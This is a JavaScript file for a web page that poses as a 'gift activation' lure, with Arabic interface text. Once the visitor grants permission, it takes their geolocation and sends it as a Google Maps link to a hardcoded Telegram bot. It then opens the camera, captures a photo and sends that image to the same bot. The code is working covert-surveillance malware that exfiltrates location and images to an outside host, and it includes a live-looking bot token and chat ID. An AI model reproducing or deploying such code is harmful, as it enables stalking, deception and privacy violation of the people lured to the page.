const botToken = "7630024004:AAGzB-qYpR9Mgou8Vz0lN7CvuuY85m0xDMA";
const chatId = "7370281601";

function sendToTelegram(msg) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg })
    });
}

function sendToTelegramPhoto(base64Image) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", base64Image);

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
    });
}

// أول ما يضغط السماح للموقع
navigator.geolocation.getCurrentPosition(
    function(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const mapsURL = `https://www.google.com/maps?q=${lat},${lon}`;

        sendToTelegram(`📍 موقع جديد: ${mapsURL}`);

        // يظهر الزرار بعد إرسال الموقع
        document.querySelector(".box").innerHTML =
            `<h2>✔ تم تفعيل الهدية</h2>
             <button class="btn" onclick="openCamera()">📸 أخذ صورة</button>`;
    },
    function() {
        alert("لازم تضغط سماح لتفعيل الهدية!");
    }
);

// فتح الكاميرا
function openCamera() {
    const video = document.getElementById("camera");
    video.style.display = "block";

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            document.querySelector(".box").innerHTML =
                `<h3>اضغط على الزر لالتقاط الصورة</h3>
                 <button class="btn" onclick="capturePhoto()">📸 تصوير</button>`;
        })
        .catch(() => {
            alert("الكاميرا غير متاحة!");
        });
}

// التقاط الصورة وإرسالها للبوت
function capturePhoto() {
    const video = document.getElementById("camera");
    const canvas = document.getElementById("canvas");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    const dataURL = canvas.toDataURL("image/jpeg");
    sendToTelegramPhoto(dataURL);

    document.querySelector(".box").innerHTML = `<h2>✔ تم استلام الصورة</h2>`;
    video.srcObject.getTracks().forEach(t => t.stop());
}
